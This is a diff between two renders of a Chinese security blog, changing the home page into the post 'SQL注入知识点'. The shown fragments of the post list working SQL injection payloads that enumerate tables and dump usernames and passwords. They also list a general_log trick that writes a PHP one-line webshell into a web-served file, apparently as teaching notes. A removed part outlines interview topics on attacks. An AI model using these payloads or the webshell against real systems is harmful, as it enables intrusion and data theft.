@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="SQL注入,WEB安全," />
 
 
 
@@ -79,13 +79,21 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="欣海余诚&#39;s blog">
-<meta property="og:url" content="http://example.com/index.html">
+<meta name="description" content="0x01 常见注入类型一、带回显1. 联合注入12345678910111213id&#x3D;1&amp;#x27; and 1&#x3D;1--+   &#x3D;&#x3D;&gt;   id&#x3D;1&amp;#x27; and 1^0--+   &#x3D;&#x3D;&gt;  select !0id&#x3D;1&amp;#x27; and 1&#x3D;2--+   &#x3D;&#x3D;&gt;   id&#x3D;1&amp;#x27; and 1^1--+   &#x3D;&#x3D;&gt;1&amp;#x27; and &amp;#x27;1&amp;#x2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入知识点">
+<meta property="og:url" content="http://example.com/2021/07/05/SQL_Injection/index.html">
 <meta property="og:site_name" content="欣海余诚&#39;s blog">
+<meta property="og:description" content="0x01 常见注入类型一、带回显1. 联合注入12345678910111213id&#x3D;1&amp;#x27; and 1&#x3D;1--+   &#x3D;&#x3D;&gt;   id&#x3D;1&amp;#x27; and 1^0--+   &#x3D;&#x3D;&gt;  select !0id&#x3D;1&amp;#x27; and 1&#x3D;2--+   &#x3D;&#x3D;&gt;   id&#x3D;1&amp;#x27; and 1^1--+   &#x3D;&#x3D;&gt;1&amp;#x27; and &amp;#x27;1&amp;#x2">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/07/05/SQL_Injection/3DB64B1FF8734B048A39EAA032BA5D6B">
+<meta property="article:published_time" content="2021-07-05T10:07:46.707Z">
+<meta property="article:modified_time" content="2021-07-05T10:07:46.703Z">
 <meta property="article:author" content="欣海余诚">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="WEB安全">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/07/05/SQL_Injection/3DB64B1FF8734B048A39EAA032BA5D6B">
 
 
 
@@ -115,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="http://example.com/"/>
+  <link rel="canonical" href="http://example.com/2021/07/05/SQL_Injection/"/>
 
 
 
 
 
-  <title>欣海余诚's blog</title>
+  <title>SQL注入知识点 | 欣海余诚's blog</title>
   
 
 
@@ -140,8 +148,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -244,9 +251,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -276,9 +283,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/07/05/SQL_Injection/" itemprop="url">SQL注入知识点</a></h1>
+          <h1 class="post-title" itemprop="name headline">SQL注入知识点</h1>
         
 
         <div class="post-meta">
@@ -350,9 +355,7 @@
       
 
       
-        
-          
-            <h2 id="0x01-常见注入类型"><a href="#0x01-常见注入类型" class="headerlink" title="0x01 常见注入类型"></a>0x01 常见注入类型</h2><h3 id="一、带回显"><a href="#一、带回显" class="headerlink" title="一、带回显"></a>一、带回显</h3><h4 id="1-联合注入"><a href="#1-联合注入" class="headerlink" title="1. 联合注入"></a>1. 联合注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=1--+   ==&gt;   id=1&#x27; and 1^0--+   ==&gt;  select !0</span><br><span class="line">id=1&#x27; and 1=2--+   ==&gt;   id=1&#x27; and 1^1--+   ==&gt;</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27; --+</span><br><span class="line">1&#x27; order by 2 -- -</span><br><span class="line">1&#x27; union select 1,2-- -</span><br><span class="line">注表名</span><br><span class="line">1&#x27; union select database(), group_concat(table_name) from information_schema.tables where table_schema=database()-- -</span><br><span class="line">注列名：</span><br><span class="line">1&#x27; union select table_name, group_concat(column_name) from information_schema.columns where table_name=&#x27;xxx&#x27;-- -;</span><br><span class="line"> select !1</span><br><span class="line">//注flag：</span><br><span class="line">id=-1&#x27;%20union%20select%201,username,password%20from%20security.users--+</span><br></pre></td></tr></table></figure>
+        <h2 id="0x01-常见注入类型"><a href="#0x01-常见注入类型" class="headerlink" title="0x01 常见注入类型"></a>0x01 常见注入类型</h2><h3 id="一、带回显"><a href="#一、带回显" class="headerlink" title="一、带回显"></a>一、带回显</h3><h4 id="1-联合注入"><a href="#1-联合注入" class="headerlink" title="1. 联合注入"></a>1. 联合注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=1--+   ==&gt;   id=1&#x27; and 1^0--+   ==&gt;  select !0</span><br><span class="line">id=1&#x27; and 1=2--+   ==&gt;   id=1&#x27; and 1^1--+   ==&gt;</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27; --+</span><br><span class="line">1&#x27; order by 2 -- -</span><br><span class="line">1&#x27; union select 1,2-- -</span><br><span class="line">注表名</span><br><span class="line">1&#x27; union select database(), group_concat(table_name) from information_schema.tables where table_schema=database()-- -</span><br><span class="line">注列名：</span><br><span class="line">1&#x27; union select table_name, group_concat(column_name) from information_schema.columns where table_name=&#x27;xxx&#x27;-- -;</span><br><span class="line"> select !1</span><br><span class="line">//注flag：</span><br><span class="line">id=-1&#x27;%20union%20select%201,username,password%20from%20security.users--+</span><br></pre></td></tr></table></figure>
 <h4 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2.报错注入"></a>2.报错注入</h4><ol>
 <li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e097a1c0d9ef">双查询注入(Duplicate entry报错)</a></li>
 </ol>
@@ -467,8 +470,6 @@
 <p>general_log</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=&#x27;on&#x27;;</span><br><span class="line"></span><br><span class="line">SET global general_log_file=&#x27;E:/UPUPW_AP5.6-1510/UPUPW_AP5.6/htdocs/classes.php&#x27;; </span><br><span class="line"></span><br><span class="line">SELECT &#x27;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure>
 
-          
-        
       
     </div>
     
@@ -483,457 +484,38 @@
 
     <footer class="post-footer">
       
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/03/Summary_of_interview_knowledge/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="欣海余诚's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/07/03/Summary_of_interview_knowledge/" itemprop="url">安全运营工程师面试知识点汇总</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-07-03T23:43:27+08:00">
-                2021-07-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
+        <div class="post-tags">
           
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
-                    <span itemprop="name">安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
+            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
           
-
+            <a href="/tags/WEB%E5%AE%89%E5%85%A8/" rel="tag"># WEB安全</a>
           
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><ul>
-<li>SQL注入<ul>
-<li>分类</li>
-<li>手写mysql手注payload（union、报错、延时）</li>
-<li>如何区分后端数据库</li>
-<li>oracle/sqlserver注入</li>
-<li>不同注入场景下注入<ul>
-<li>宽字节注入</li>
-<li>二次注入</li>
-<li>order by注入</li>
-<li>limit 注入</li>
-<li>table 名注入</li>
-<li>update/insert 注入</li>
-</ul>
-</li>
-<li>绕过方式</li>
-<li>getshell<ul>
-<li>general_log</li>
-<li>select into dump_file 有什么条件</li>
-<li>站库分离怎么办</li>
-</ul>
-</li>
-<li>提权<ul>
-<li>UDF提权</li>
-</ul>
-</li>
-<li>防御方式<ul>
-<li>使用预编译是否可以防止所有sql注入？</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>XSS<ul>
-<li>分类（反射、DOM、存储）<ul>
-<li>DOM 一定不经过服务器吗？</li>
-</ul>
-</li>
-<li>防御方式（转义、CSP）</li>
-<li>相关概念（同源策略、Jsonp、CORS）</li>
-<li>利用方式（除盗cookie外）</li>
-</ul>
-</li>
-<li>CSRF<ul>
-<li>防御方式<ul>
-<li>使用Referer防御是否一定可靠？</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>SSRF<ul>
-<li>绕过<ul>
-<li>host 绕过</li>
-<li>ip进制绕过</li>
-<li>控制域名解析</li>
-<li>302跳转</li>
-<li>dns rebinding (ttl)</li>
-</ul>
-</li>
-<li>有回显利用<ul>
-<li>端口扫描</li>
-<li>攻击redis</li>
-</ul>
-</li>
-<li>无回显利用<ul>
-<li>dnslog</li>
-</ul>
-</li>
-<li>防御</li>
-</ul>
-</li>
-<li>文件上传<ul>
-<li>绕过方式</li>
-<li>防御方式</li>
-</ul>
-</li>
-<li>命令执行<ul>
-<li>php<ul>
-<li>绕过姿势</li>
-<li>shell_exec和exec的区别</li>
-</ul>
-</li>
-<li>Java反序列化<ul>
-<li>Shiro<ul>
-<li>550</li>
-<li>721</li>
-<li>权限绕过</li>
-</ul>
-</li>
-<li>Fastjson<ul>
-<li>漏洞原理</li>
-<li>黑名单检查函数</li>
-<li>利用链</li>
-</ul>
-</li>
-<li>Weblogic<ul>
-<li>漏洞类型、原理</li>
-<li>漏洞函数</li>
-</ul>
-</li>
-<li>ysoserial<ul>
-<li>原理</li>
-<li>链</li>
-</ul>
-</li>
-<li>SpEL/OGNL 表达式注入</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>其它<ul>
-<li>XXE</li>
-<li>https握手流程</li>
-<li>中间人攻击原理</li>
-</ul>
-</li>
-</ul>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><ul>
-<li>反弹shell<ul>
-<li>类型</li>
-<li>检测原理</li>
-</ul>
-</li>
-<li>正向shell<ul>
-<li>reg</li>
-<li>?</li>
-</ul>
-</li>
-<li>webshell<ul>
-<li>disable_functions绕过</li>
-<li>内存马</li>
-</ul>
-</li>
-<li>权限维持<ul>
-<li>系统后门</li>
-<li>无文件攻击</li>
-<li>dll劫持，dll注入</li>
-</ul>
-</li>
-<li>痕迹清理<ul>
-<li>C2隐藏 </li>
-</ul>
-</li>
-<li>钓鱼<ul>
-<li>姿势</li>
-</ul>
-</li>
-</ul>
-<h2 id="名词概念"><a href="#名词概念" class="headerlink" title="名词概念"></a>名词概念</h2><ul>
-<li>ATT&amp;CK</li>
-<li>SPF</li>
-<li>DMARC</li>
-</ul>
-<h2 id="应急"><a href="#应急" class="headerlink" title="应急"></a>应急</h2><ul>
-<li>病毒排查及溯源</li>
-<li>Webshell排查及溯源</li>
-</ul>
-<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><ul>
-<li>linux/Windows提权</li>
-<li>域认证方式</li>
-<li>域内委派</li>
-<li>bypass uac 技巧，方法 ，原理</li>
-<li>$IPC连接</li>
-<li>wmic用法</li>
-<li>psexec用法</li>
-<li>黄金票据</li>
-<li>白银票据</li>
-<li>PTH/PTT</li>
-<li>Windows defender安全机制</li>
-</ul>
-<h3 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h3><ul>
-<li>Tomcat</li>
-<li>Springboot</li>
-<li>最近曝光有重大影响的漏洞</li>
-<li>nmap指纹识别原理及用法</li>
-</ul>
-<h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><ul>
-<li>注册场景</li>
-<li>登录场景</li>
-<li>活动场景</li>
-<li>支付场景</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
       
 
       
       
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
       
 
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/03/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="欣海余诚's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/07/03/hello-world/" itemprop="url">Hello World</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
             
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-07-03T23:42:56+08:00">
-                2021-07-03
-              </time>
+              <a href="/2021/07/03/Summary_of_interview_knowledge/" rel="next" title="安全运营工程师面试知识点汇总">
+                <i class="fa fa-chevron-left"></i> 安全运营工程师面试知识点汇总
+              </a>
             
+          </div>
 
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
             
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+          </div>
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          
-            <p>习惯成自然</p>
-<p>Habit is secone nature.</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -943,10 +525,11 @@
   </article>
 
 
-    
-  </section>
 
-  
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -954,6 +537,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -974,8 +561,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -1035,6 +631,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%B8%B8%E8%A7%81%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.</span> <span class="nav-text">0x01 常见注入类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%B8%A6%E5%9B%9E%E6%98%BE"><span class="nav-number">1.1.</span> <span class="nav-text">一、带回显</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.1.</span> <span class="nav-text">1. 联合注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.2.</span> <span class="nav-text">2.报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="nav-number">1.1.3.</span> <span class="nav-text">二、无回显</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4"><span class="nav-number">1.1.4.</span> <span class="nav-text">1. 基于时间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%9F%BA%E4%BA%8Ebool"><span class="nav-number">1.1.5.</span> <span class="nav-text">2. 基于bool</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-DNSLOG%E5%B8%A6%E5%A4%96"><span class="nav-number">1.1.6.</span> <span class="nav-text">3. DNSLOG带外</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-%E5%A6%82%E4%BD%95%E5%8C%BA%E5%88%86%E5%90%8E%E7%AB%AF%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 如何区分后端数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E7%9C%8B%E6%8A%A5%E9%94%99"><span class="nav-number">1.2.1.</span> <span class="nav-text">1. 看报错</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E9%80%9A%E8%BF%87%E5%90%84%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%B9%E6%9C%89%E7%9A%84%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%92%8C%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%9D%A5%E5%88%A4%E6%96%AD"><span class="nav-number">1.2.2.</span> <span class="nav-text">2. 通过各个数据库特有的数据表和环境变量来判断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E9%80%9A%E8%BF%87%E5%90%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%B9%E6%9C%89%E7%9A%84%E8%BF%9E%E6%8E%A5%E7%AC%A6%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.2.3.</span> <span class="nav-text">3. 通过各数据库特有的连接符判断数据库类型</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-%E6%B3%A8%E5%85%A5%E4%BD%8D%E7%BD%AE"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 注入位置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-limit%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.1.</span> <span class="nav-text">1. limit注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-order-by%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.2.</span> <span class="nav-text">2. order by注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E8%A1%A8%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.3.</span> <span class="nav-text">3. 表名注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-%E7%BB%95%E8%BF%87"><span class="nav-number">1.4.</span> <span class="nav-text">0x04 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%9B%BF%E6%8D%A2%E9%80%97%E5%8F%B7"><span class="nav-number">1.4.1.</span> <span class="nav-text">1. 替换逗号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E7%AC%A6%E5%8F%B7%E6%9B%BF%E6%8D%A2"><span class="nav-number">1.4.2.</span> <span class="nav-text">2. 符号替换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mysql-real-escape-string-%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E8%BD%AC%E4%B9%89%E2%80%99%E3%80%81%E2%80%9D%E3%80%81-r%E3%80%81-n%E3%80%81NULL%E3%80%81Contral-z"><span class="nav-number">1.4.3.</span> <span class="nav-text">mysql_real_escape_string ————转义’、”、\r、\n、NULL、Contral-z</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-sqlmap-tamper"><span class="nav-number">1.4.4.</span> <span class="nav-text">3. sqlmap tamper</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-getshell"><span class="nav-number">1.5.</span> <span class="nav-text">0x05 getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%B3%A8%E5%85%A5%E5%86%99shell"><span class="nav-number">1.5.1.</span> <span class="nav-text">1. 注入写shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%97%A5%E5%BF%97%E5%86%99shell"><span class="nav-number">1.5.2.</span> <span class="nav-text">2. 日志写shell</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -1175,6 +787,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
